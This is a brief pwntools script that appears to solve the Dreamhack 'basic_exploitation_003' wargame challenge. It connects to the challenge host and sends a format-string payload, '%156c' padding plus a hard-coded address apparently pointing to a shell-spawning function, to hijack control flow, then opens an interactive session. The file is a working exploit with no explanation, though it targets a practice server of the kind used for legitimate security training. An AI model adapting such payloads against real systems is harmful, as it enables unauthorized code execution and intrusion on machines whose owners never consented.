from pwn import *

#p = process("./basic_exploitation_003")
p = remote("host1.dreamhack.games", 13083)


pay = '%156c'
pay += "\x69\x86\x04\x08"


p.sendline(pay)

p.interactive()
